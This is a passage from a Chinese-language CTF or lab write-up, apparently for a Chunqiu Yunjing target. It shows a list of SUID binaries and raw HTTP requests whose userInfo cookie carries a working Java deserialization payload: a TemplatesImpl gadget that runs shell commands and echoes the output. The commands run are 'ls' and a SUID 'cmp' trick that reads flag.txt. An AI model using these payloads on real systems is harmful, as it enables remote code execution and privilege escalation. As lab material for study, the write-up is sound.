class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/5.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/<span class="built_in">mount</span></span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/cmp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/lib/polkit<span class="literal">-1</span>/polkit<span class="literal">-agent-helper-1</span></span><br><span class="line">/usr/lib/snapd/snap<span class="literal">-confine</span></span><br><span class="line">/usr/lib/dbus<span class="literal">-1</span>.<span class="number">0</span>/dbus<span class="literal">-daemon-launch-helper</span></span><br><span class="line">/usr/lib/openssh/ssh<span class="literal">-keysign</span></span><br></pre></td></tr></table></figure>



<p>ls可以看到flag就在当前目录</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=<span class="number">8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAFbBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaLBocGnwK7BlMGywaXBpcGCwaHBp5SVecHY59tsAwAAeHBzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaR0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwYPBr8GtwbDBocGywaHBtMGvwbLAu0wAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAAXNyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAA2cyv66vgAAADQA1AoAIgBlCQA7AGYKAAwAZwgAaAoADABpCABqBwBrCQA7AGwKAAcAbQoAOwBuCgAMAG8HAHAIAHEKAHIAcwoADAB0CAB1CgAMAHYIAD4IAHcIAHgIAHkKAHoAewoAegB8CgB9AH4KAAcAfwcAgAoAgQCCCgCBAIMIAIQKAIUAhggAhwcAiAoAIACJBwCKCgCLAIwIAI0IAI4IAI8IAJAKACAAkQoAIgCSCACTCgCLAJQJADsAlQgAlggAlwkAOwCYCACZCgAHAJoKAAcAmwgAnAgAnQgAnggAnwgAoAgAoQgAogoAOwCjBwCkAQAJaGVhZGVyS2V5AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQAGYWN0aW9uAQAIcG9zaXRpb24BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExwYXlsb2FkL1NwcmluZ0VjaG87AQAFc3RhcnQBAAV2YXIxMQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBwBwBKBwCAAQAERWNobwEAFihMamF2YS91dGlsL1NjYW5uZXI7KVYBAAdzY2FubmVyAQATTGphdmEvdXRpbC9TY2FubmVyOwEABHZhcjABABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjEBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABHZhcjIBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI0AQAEdmFyNgEABHZhcjcBAAR2YXI4BwBrBwCIBwClBwCKAQAKRXhjZXB0aW9ucwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAD1NwcmluZ0VjaG8uamF2YQwAQQBCDAA/AD0MAKYApwEABGVjaG8MAKgAqQEABGV4ZWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPgA9DABBAKoMAE8AUAwAqwCsAQAQamF2YS9sYW5nL1N0cmluZwEAB29zLm5hbWUHAK0MAK4ArwwAsACxAQADV0lODACyALMBAAIvYwEABy9iaW4vc2gBAAItYwcAtAwAtQC2DABqALcHALgMALkAugwAQQC7AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAvAwAvQC+DAC/AMABADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAMEMAMIAwwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDADEAMUBABBqYXZhL2xhbmcvT2JqZWN0BwClDADGAMcBAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgwAyADFDADJAMoBAAlhZGRIZWFkZXIMAMsAzAwAQAA9AQAGaGVhZGVyAQAEYm9keQwAPAA9AQACXEEMAM0AzgwAzwCxAQAHcHJpbnRsbgEABWZsdXNoAQAFY2xvc2UBAARFdGFnAQACbHMBAARleGVjAQAEYm9keQwASABCAQAIU0ptU0p4a0gBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAhoYXNoQ29kZQEAAygpSQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAB2lzRW1wdHkBAAMoKVoBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvVXBwZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0BwDQDABBAEIKANEA0gAhADsA0QAAAAQACAA8AD0AAAAIAD4APQAAAAgAPwA9AAAACABAAD0AAAAEAAEAQQBCAAEAQwAAAC8AAQABAAAABSq3ANOxAAAAAgBEAAAABgABAAAABgBFAAAADAABAAAABQBGAEcAAAAJAEgAQgABAEMAAAFIAAQAAwAAALyyAAJLAjwqtgADqwAAAAAzAAAAAgAvaiUAAAAaAC+<span class="number">4</span>kQAAACgqEgS2AAWZABMDPKcADioSBrYABZkABQQ8G6sAAAAAeQAAAAIAAAAAAAAAGgAAAAEAAAAquwAHWbIACLcACbgACqcAUrIACLYAC5oASQa9AAxNEg24AA62AA8SELYAEZkAECwDEhJTLAQSE1OnAA0sAxIUUywEEhVTLAWyAAhTuwAHWbgAFiy2ABe2ABi3ABm4AAqnAARLsQABAAAAtwC6ABoAAwBEAAAAPgAPAAAAEgBYABQAZQAVAGgAFwBxABgAdgAZAIYAGgCLABsAkwAdAJgAHgCdACAAowAhALcAJgC6ACUAuwAnAEUAAAAMAAEAdgBBAEkASgACAEsAAAAcAAr9ACQHAEwBDQoaD/wAKgcATQn4ABlCBwBOAAAKAE8AUAACAEMAAAJNAAcACgAAAWe4ABu2ABwSHbYAHkwrEh8DvQAgtgAhTSwBA70AIrYAI064ABu2ABwSJLYAHkwrEiUDvQAgtgAhTSwtA70AIrYAIzoEuAAbtgAcEia2AB4SJwO9ACC2ACg6BRkEtgApEioFvQAgWQMSDFNZBBIMU7YAKDoGGQYEtgArGQUEtgArGQUZBAO9ACK2ACM6B7IALDoIAjYJGQi2AAOrAAAAAAA4AAAAArc04o0AAAAbAC45ogAAACsZCBIttgAFmQAWAzYJpwAQGQgSLrYABZkABgQ2CRUJqwAAAJMAAAACAAAAAAAAABkAAAABAAAAOhkGGQQFvQAiWQOyAC9TWQQqEjC2ADG2ADJTtgAjV6cAXBkHtgApEjMEvQAgWQMSDFO2ACgZBwS9ACJZAyoSMLYAMbYAMlO2ACNXGQe2ACkSNAO9ACC2ACgZBwO9ACK2ACNXGQe2ACkSNQO9ACC2ACgZBwO9ACK2ACNXsQAAAAMARAAAAEoAEgAAACkADAAqABcAKwAhACwALQAtADgALgBDAC8AWQAwAHMAMQB5ADIAfwAzAIwANQDsADcBCgA4AQ0AOgE2ADsBTgA8AWYAPwBFAAAAUgAIAAABZwBRAFIAAAAMAVsAUwBUAAEAFwFQAFUAVgACACEBRgBXAFgAAwBDASQAWQBYAAQAWQEOAFoAVgAFAHMA9ABbAFYABgCMANsAXABYAAcASwAAACwABv8AtAAKBwBdBwBeBwBfBwBgBwBgBwBfBwBfBwBgBwBMAQAADwwaIPkAWABhAAAABAABABoACABiAEIAAQBDAAAARAABAAAAAAAYEjazAC8SN7MACBI4swACEjmzACy4ADqxAAAAAQBEAAAAGgAGAAAABwAFAAgACgAJAA8ACgAUAAwAFwANAAEAYwAAAAIAZHVxAH4AGAAAAPLK/rq+AAAAMQATAQADRm9vBwABAQAQamF2YS9sYW5nL09iamVjdAcAAwEAClNvdXJjZUZpbGUBAAhGb28uamF2YQEAFGphdmEvaW8vU2VyaWFsaXphYmxlBwAHAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoFceZp7jxtRxgBAA1Db25zdGFudFZhbHVlAQAGPGluaXQ+AQADKClWDAAOAA8KAAQAEAEABENvZGUAIQACAAQAAQAIAAEAGgAJAAoAAQANAAAAAgALAAEAAQAOAA8AAQASAAAAEQABAAEAAAAFKrcAEbEAAAAAAAEABQAAAAIABnB0AALBkHB3AQB4dwQAAAABeA==</span><br><span class="line">Connection: keep<span class="literal">-alive</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/6.png"></p>
<p>如果不知道用哪个命令提权可以尝试问ai</p>
<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E2%80%93Aoselu/7.png"></p>
<p>这里我们直接使用这个命令读取就好了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/cmp <span class="literal">-l</span> ./flag.txt /dev/zero | awk <span class="string">&#x27;&#123;printf &quot;%c&quot;, strtonum(&quot;0&quot;$2)&#125;&#x27;</span></span><br></pre></td></tr></table></figure>





<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GET /mail/u/<span class="number">0</span>/ HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">138.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=<span class="number">8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">39.98</span>.<span class="number">116.223</span>:<span class="number">8080</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate, br</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">Cookie: userInfo=rO0ABXNyAFbBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaLBocGnwK7BlMGywaXBpcGCwaHBp5SVecHY59tsAwAAeHBzcgCEwa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGjwa/BrcGwwaHBssGhwbTBr8GywbPArsGUwbLBocGuwbPBpsGvwbLBrcGpwa7Bp8GDwa/BrcGwwaHBssGhwbTBr8GyL/mE8CuxCMwCAAJMABLBpMGlwaPBr8GywaHBtMGlwaR0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwYPBr8GtwbDBocGywaHBtMGvwbLAu0wAFsG0wbLBocGuwbPBpsGvwbLBrcGlwbJ0AFrBjMGvwbLBp8CvwaHBsMGhwaPBqMGlwK/Bo8Gvwa3BrcGvwa7Bs8CvwaPBr8GswazBpcGjwbTBqcGvwa7Bs8C0wK/BlMGywaHBrsGzwabBr8Gywa3BpcGywLt4cHNyAIDBr8GywafArsGhwbDBocGjwajBpcCuwaPBr8Gtwa3Br8GuwbPArsGjwa/BrMGswaXBo8G0wanBr8GuwbPAtMCuwaPBr8GtwbDBocGywaHBtMGvwbLBs8CuwYPBr8GtwbDBocGywaHBosGswaXBg8Gvwa3BsMGhwbLBocG0wa/Bsvv0mSW4brE3AgAAeHBzcgB2wa/BssGnwK7BocGwwaHBo8GowaXArsGjwa/BrcGtwa/BrsGzwK7Bo8GvwazBrMGlwaPBtMGpwa/BrsGzwLTArsGmwbXBrsGjwbTBr8GywbPArsGJwa7BtsGvwavBpcGywZTBssGhwa7Bs8Gmwa/BssGtwaXBsofo/<span class="number">2</span>t7fM44AgADWwAKwanBgcGywafBs3QAJsGbwYzBqsGhwbbBocCvwazBocGuwafAr8GPwaLBqsGlwaPBtMC7TAAWwanBjcGlwbTBqMGvwaTBjsGhwa3BpXQAJMGMwarBocG2waHAr8GswaHBrsGnwK/Bk8G0wbLBqcGuwafAu1sAFsGpwZDBocGywaHBrcGUwbnBsMGlwbN0ACTBm8GMwarBocG2waHAr8GswaHBrsGnwK/Bg8GswaHBs8GzwLt4cHVyACbBm8GMwarBocG2waHArsGswaHBrsGnwK7Bj8GiwarBpcGjwbTAu5DOWJ8QcylsAgAAeHAAAAAAdAAcwa7BpcG3wZTBssGhwa7Bs8Gmwa/BssGtwaXBsnVyACTBm8GMwarBocG2waHArsGswaHBrsGnwK7Bg8GswaHBs8GzwLurFteuy81amQIAAHhwAAAAAHcEAAAAAXNyAHTBo8Gvwa3ArsGzwbXBrsCuwa/BssGnwK7BocGwwaHBo8GowaXArsG4waHBrMGhwa7ArsGpwa7BtMGlwbLBrsGhwazArsG4wbPBrMG0waPArsG0wbLBocG4wK7BlMGlwa3BsMGswaHBtMGlwbPBicGtwbDBrAlXT8FurKszAwAGSQAawZ/BqcGuwaTBpcGuwbTBjsG1wa3BosGlwbJJABzBn8G0wbLBocGuwbPBrMGlwbTBicGuwaTBpcG4WwAUwZ/BosG5wbTBpcGjwa/BpMGlwbN0AAbBm8GbwYJbAAzBn8GjwazBocGzwbNxAH4AC0wACsGfwa7BocGtwaVxAH4ACkwAIsGfwa/BtcG0wbDBtcG0wZDBssGvwbDBpcGywbTBqcGlwbN0ACzBjMGqwaHBtsGhwK/BtcG0wanBrMCvwZDBssGvwbDBpcGywbTBqcGlwbPAu3hwAAAAAP////<span class="number">91</span>cgAGwZvBm8<span class="built_in">GCS</span>/<span class="number">0</span>ZFWdn2zcCAAB4cAAAAAJ1cgAEwZvBgqzzF/gGCFTgAgAAeHAAAA3lyv66vgAAADQA1AoAIgBlCQA7AGYKAAwAZwgAaAoADABpCABqBwBrCQA7AGwKAAcAbQoAOwBuCgAMAG8HAHAIAHEKAHIAcwoADAB0CAB1CgAMAHYIAD4IAHcIAHgIAHkKAHoAewoAegB8CgB9AH4KAAcAfwcAgAoAgQCCCgCBAIMIAIQKAIUAhggAhwcAiAoAIACJBwCKCgCLAIwIAI0IAI4IAI8IAJAKACAAkQoAIgCSCACTCgCLAJQJADsAlQgAlggAlwkAOwCYCACZCgAHAJoKAAcAmwgAnAgAnQgAnggAnwgAoAgAoQgAogoAOwCjBwCkAQAJaGVhZGVyS2V5AQASTGphdmEvbGFuZy9TdHJpbmc7AQADY21kAQAGYWN0aW9uAQAIcG9zaXRpb24BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFExwYXlsb2FkL1NwcmluZ0VjaG87AQAFc3RhcnQBAAV2YXIxMQEAE1tMamF2YS9sYW5nL1N0cmluZzsBAA1TdGFja01hcFRhYmxlBwBwBwBKBwCAAQAERWNobwEAFihMamF2YS91dGlsL1NjYW5uZXI7KVYBAAdzY2FubmVyAQATTGphdmEvdXRpbC9TY2FubmVyOwEABHZhcjABABFMamF2YS9sYW5nL0NsYXNzOwEABHZhcjEBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABHZhcjIBABJMamF2YS9sYW5nL09iamVjdDsBAAR2YXI0AQAEdmFyNgEABHZhcjcBAAR2YXI4BwBrBwCIBwClBwCKAQAKRXhjZXB0aW9ucwEACDxjbGluaXQ+AQAKU291cmNlRmlsZQEAD1NwcmluZ0VjaG8uamF2YQwAQQBCDAA/AD0MAKYApwEABGVjaG8MAKgAqQEABGV4ZWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAPgA9DABBAKoMAE8AUAwAqwCsAQAQamF2YS9sYW5nL1N0cmluZwEAB29zLm5hbWUHAK0MAK4ArwwAsACxAQADV0lODACyALMBAAIvYwEABy9iaW4vc2gBAAItYwcAtAwAtQC2DABqALcHALgMALkAugwAQQC7AQATamF2YS9sYW5nL0V4Y2VwdGlvbgcAvAwAvQC+DAC/AMABADxvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuUmVxdWVzdENvbnRleHRIb2xkZXIHAMEMAMIAwwEAFGdldFJlcXVlc3RBdHRyaWJ1dGVzAQAPamF2YS9sYW5nL0NsYXNzDADEAMUBABBqYXZhL2xhbmcvT2JqZWN0BwClDADGAMcBAEBvcmcuc3ByaW5nZnJhbWV3b3JrLndlYi5jb250ZXh0LnJlcXVlc3QuU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzAQALZ2V0UmVzcG9uc2UBAB1qYXZheC5zZXJ2bGV0LlNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgwAyADFDADJAMoBAAlhZGRIZWFkZXIMAMsAzAwAQAA9AQAGaGVhZGVyAQAEYm9keQwAPAA9AQACXEEMAM0AzgwAzwCxAQAHcHJpbnRsbgEABWZsdXNoAQAFY2xvc2UBAARFdGFnAQBLL3Vzci9iaW4vY21wIC1sIC4vZmxhZy50eHQgL2Rldi96ZXJvIHwgYXdrICd7cHJpbnRmICIlYyIsIHN0cnRvbnVtKCIwIiQyKX0nAQAEZXhlYwEABGJvZHkMAEgAQgEACFNKbVNKeGtIAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAIaGFzaENvZGUBAAMoKUkBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAdpc0VtcHR5AQADKClaAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAAt0b1VwcGVyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAQamF2YS9sYW5nL1RocmVhZAEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQANc2V0QWNjZXNzaWJsZQEABChaKVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAcA0AwAQQBCCgDRANIAIQA7ANEAAAAEAAgAPAA9AAAACAA+AD0AAAAIAD8APQAAAAgAQAA9AAAABAABAEEAQgABAEMAAAAvAAEAAQAAAAUqtwDTsQAAAAIARAAAAAYAAQAAAAYARQAAAAwAAQAAAAUARgBHAAAACQBIAEIAAQBDAAABSAAEAAMAAAC8sgACSwI8KrYAA6sAAAAAMwAAAAIAL2olAAAAGgAvuJEAAAAoKhIEtgAFmQATAzynAA4qEga2AAWZAAUEPBurAAAAAHkAAAACAAAAAAAAABoAAAABAAAAKrsAB1myAAi3AAm4AAqnAFKyAAi2AAua